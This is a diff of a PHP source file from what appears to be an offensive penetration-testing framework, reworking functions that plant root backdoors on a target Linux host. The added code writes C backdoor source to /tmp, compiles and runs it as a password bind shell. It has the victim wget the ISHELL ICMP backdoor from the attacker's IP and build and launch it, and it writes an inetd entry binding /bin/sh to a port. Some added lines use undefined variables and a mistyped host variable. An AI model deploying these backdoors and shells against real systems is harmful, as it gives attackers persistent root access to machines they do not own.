@@ -83,9 +83,11 @@ This can be handy to get a list of processes and their PID number.");
         
         
         $attacker_port = rand(1024,65535);
-        $this->root2backdoor2tcp2poc4prism($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol);$this->pause(); // OK
+        $this->root2backdoor2tcp2server8prism($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol);$this->pause(); // OK
         $attacker_port = rand(1024,65535);
-        $this->root2backdoor2tcp($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol);$this->pause();
+        $this->root2backdoor2tcp2server($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol);$this->pause();
+        $victime_port = rand(1024,65535);
+        $this->root2backdoor2tcp2bind8passwd($this->created_user_pass,$attacker_ip,$victime_port,$attacker_protocol);$this->pause();
         $attacker_port = rand(1024,65535);
         //$this->root2backdoor2udp($attacker_ip,$attacker_port);$this->pause();
         
@@ -99,7 +101,7 @@ This can be handy to get a list of processes and their PID number.");
     
     
     
-    public function root2backdoor2udp($attacker_ip,$attacker_port){
+    public function root2backdoor2udp2server($attacker_ip,$attacker_port){
         $this->ssTitre(__FUNCTION__);
         $sbin_path_hidden = "";
         $rev_id = $this->backdoor8c2udp($sbin_path_hidden, $attacker_ip, $attacker_port);
@@ -133,7 +135,37 @@ This can be handy to get a list of processes and their PID number.");
     }
     
     
-    public function root2backdoor2tcp($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol){
+    public function root2backdoor2tcp2bind8passwd($attacker_password,$attacker_ip,$victime_port,$attacker_protocol){
+        $this->ssTitre(__FUNCTION__);
+        $rev_id = $this->backdoor8c2tcp2passwd();
+        $rootkit_path = "/tmp/root2backdoor_passwd";
+        $query = "echo '".base64_encode($rev_id)."' | base64 -d > $rootkit_path.c";
+        $this->requette($query);
+        
+        $this->lan2stream4result($query,$this->stream_timeout);
+        $query = "gedit $rootkit_path.c";
+        //$this->requette($query);
+        $query = "gcc -DDETACH -DNORENAME -Wall -s -o $rootkit_path $rootkit_path.c ";
+        $this->lan2stream4result($query,$this->stream_timeout);
+        $query = "ls -al $rootkit_path ";
+        $this->lan2stream4result($query,$this->stream_timeout);
+        
+        $cmd2 = "$rootkit_path $victime_port $attacker_password";
+        $this->cmd("REMOTE",$cmd2);
+        $templateB64_cmd = base64_encode($cmd2);
+        
+        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
+        $query = "ps -aux | grep $rootkit_path";
+        $this->lan2stream4result($query,$this->stream_timeout);
+        
+        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $victime_port $attacker_protocol $templateB64_cmd $templateB64_shell client 60 listening_Server\" ";
+        $time = 5 ;
+        
+        $this->exec_parallel($cmd2, $cmd1, $time);
+        $this->pause();
+    }
+    
+    public function root2backdoor2tcp2server($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol){
         $this->ssTitre(__FUNCTION__);
         $rev_id = $this->backdoor8c2tcp($sbin_path_hidden, $attacker_ip, $attacker_port);
         $rootkit_path = "/tmp/root2backdoor_tcp";
@@ -170,11 +202,11 @@ This can be handy to get a list of processes and their PID number.");
     }
     
     
-    public function root2backdoor2tcp2poc4prism($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol){
+    public function root2backdoor2tcp2server8prism($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol){
         $this->ssTitre(__FUNCTION__);
         //https://github.com/andreafabrizi/prism
         
-        $rev_id = $this->backdoor8c2tcp2($sbin_path_hidden, $attacker_ip, $attacker_port);
+        $rev_id = $this->backdoor8c2tcp2prism($sbin_path_hidden, $attacker_ip, $attacker_port);
         $rootkit_path = "/tmp/root2backdoor_prism";
         $this->str2file($rev_id, $rootkit_path);
         $query = "echo '".base64_encode($rev_id)."' | base64 -d > $rootkit_path.c";
@@ -236,48 +268,59 @@ This can be handy to get a list of processes and their PID number.");
    
     
     
-    public function backdoor_linux_icmp() {
+    public function root2backdoor2icmp2server($attacker_ip,$attacker_port) {
         $this->titre(__FUNCTION__);
-        $this->backdoor_linux_icmp_server();
+        
         $this->backdoor_linux_icmp_client();
+        $this->backdoor_linux_icmp_server($attacker_ip,$attacker_port);
+        
         $cmd1 = "sudo tshark -a duration:20 -i $this->eth_lan -n icmp and \"host $this->target_ip or host $this->attacker_ip\" ";
         $cmd2 = "sudo $this->file_path -i 65535 -t $this->target_port -p 1024 $this->target_ip";
         $this->exec_parallel($cmd1, $cmd2, 3 );
         $this->pause();
     }
     
-    public function backdoor_linux_icmp_server() {
+    public function root2backdoor2icmp2server8server($attacker_ip,$attacker_port) {
         $this->ssTitre(__FUNCTION__);
-        $victime = new vm($this->target_vmx_name);
-        $victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
-        $this->cmd($this->target_vmx_name, "sudo tar -xvf $this->vm_tmp_lin/ISHELL-v0.2.tar.gz -C /opt " );
-        $this->cmd($this->target_vmx_name, "cd /opt/ISHELL-v0.2/; make linux" );
-        $this->cmd($this->target_vmx_name, "sudo /opt/ISHELL-v0.2/ishd -i 65535 -t $this->attacker_port -p 1024" );
-        $this->pause();
+        
+        $this->tcp2open4server($attacker_ip, $this->port_rfi);
+        $file_path = "$this->dir_tmp/ISHELL-v0.2.tar.gz";
+        if (!file_exists($file_path)) $this->requette("cp -v $this->dir_tools/Malware/ISHELL-v0.2.tar.gz $file_path");
+        $data = "wget http://$$attacker_ip:$this->port_rfi/ISHELL-v0.2.tar.gz -O /tmp/ISHELL-v0.2.tar.gz";
+        $this->lan2stream4result($data, $this->stream_timeout*2);
+        $data = "tar -xvf /tmp/ISHELL-v0.2.tar.gz -C /tmp ";
+        $this->lan2stream4result($data, $this->stream_timeout*2);
+        $data = "cd /tmp/ISHELL-v0.2/; make linux";
+        $this->lan2stream4result($data, $this->stream_timeout*2);
+        
+
+        
+        $cmd2 = "/tmp/ISHELL-v0.2/ishd -i 65535 -t $this->attacker_port -p 1024";
+        $this->cmd("REMOTE",$cmd2);
+        $templateB64_cmd = base64_encode($cmd2);
+
+        
+        
+        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
+        $query = "ps -aux | grep $rootkit_path";
+        $this->lan2stream4result($query,$this->stream_timeout);
+        $attacker_protocol = 'T';
+        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $attacker_protocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
+
+        $this->lan2pentest($attacker_port, $attacker_protocol, $templateB64_cmd, $templateB64_shell, $cmd2, $this->stream_timeout);
+        
+        
+        
         
     }
     
     
-    public function backdoor_linux_c2passwd(){
-        $this->ssTitre(__FUNCTION__);
-        $this->requette("cp -v $this->dir_c/backdoor_with_password.c $this->file_dir/$this->file_name.c");
-        $file_c = new FILE("$this->file_dir/$this->file_name.c");
-        $file_elf = $file_c->file_c2elf("-m32");
-        $this->file_file2virus2vt();
-        $this->elf2info();
-        $this->pause();
-        $cmd1 = "$this->file_path /bin/sh $this->attacker_port rohff ";
-        $cmd2 = "nc $this->attacker_ip $this->attacker_port -v -n";
-        $this->exec_parallel($cmd1, $cmd2, 2);
-        $this->pause();
-    }
+
     
-    public function backdoor_linux_icmp_client() {
+    public function root2backdoor2icmp2server8client() {
         $this->ssTitre(__FUNCTION__);
         $this->requette("tar -xvzf $this->dir_tools/Malware/ISHELL-v0.2.tar.gz -C $this->dir_tmp");
         $this->requette("cd $this->dir_tmp/ISHELL-v0.2/; make linux" );
-        $this->file_file2virus2vt();
-        $this->elf2info();$this->pause();
     }
     
     
@@ -291,7 +334,7 @@ This can be handy to get a list of processes and their PID number.");
          */
         $this->article("Test","Pick an obscure service from /etc/services associated with a tcp port 1024 and above…for example laplink");
         $this->requette("echo \"laplink $this->attacker_port/tcp # laplink\nlaplink stream tcp nowait /bin/sh bash -i\nrestart inetd.conf\nkillall -HUP inetd\" > $this->file_path");
-        $victime = new vm($this->target_vmx_name);
+        //$victime = new vm($this->target_vmx_name);
         //$victime->vm2upload($this->file_path, "$this->vm_tmp_lin/$this->file_ext");
         $this->cmd($this->target_ip,"bash $this->vm_tmp_lin/$this->file_ext");
         //$this->
